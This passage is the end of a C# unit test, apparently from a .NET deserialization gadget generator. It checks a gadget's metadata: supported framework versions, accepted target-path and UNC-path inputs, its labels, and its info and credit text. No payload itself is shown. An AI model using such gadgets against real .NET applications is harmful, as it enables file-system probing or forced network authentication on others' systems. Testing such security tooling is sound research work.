            AssertTrue(!facets.Versions.Contains(RuntimeVersion.Unspecified),
                "a runtime-gated gadget names at least one working version");
            AssertTrue(facets.Versions.Contains(RuntimeVersion.NetFx481),
                "4.8.1 is the build the directory read is observed on");
            AssertTrue(facets.Versions.Contains(RuntimeVersion.NetFx40),
                "and 4.0 is the floor, which is the assembly's own identity");

            // Declared inputs, because the gadget genuinely works with both a local target
            // directory (which the effect witness proves) and a UNC path.
            AssertTrue(facets.Inputs != null && facets.Inputs.Contains(PayloadInput.TargetPath),
                "a target path is an accepted input");
            AssertTrue(facets.Inputs != null && facets.Inputs.Contains(PayloadInput.UncPath),
                "and so is a UNC path");

            AssertTrue(gen.Labels().Contains(GadgetTags.Independent),
                "an independent gadget: it owns its whole chain");
            AssertEqual(0, gen.Variants().Count,
                "one type and one string, so there is nothing to branch on");
            AssertTrue(!string.IsNullOrEmpty(gen.AdditionalInfo()), "it explains itself");
            AssertTrue(gen.AdditionalInfo().Length < 200,
                "briefly, so the interactive info panel still shows the formatter and category lines");
            AssertTrue(!string.IsNullOrEmpty(gen.Finders()), "the credit is filled in");
        }

    }
}
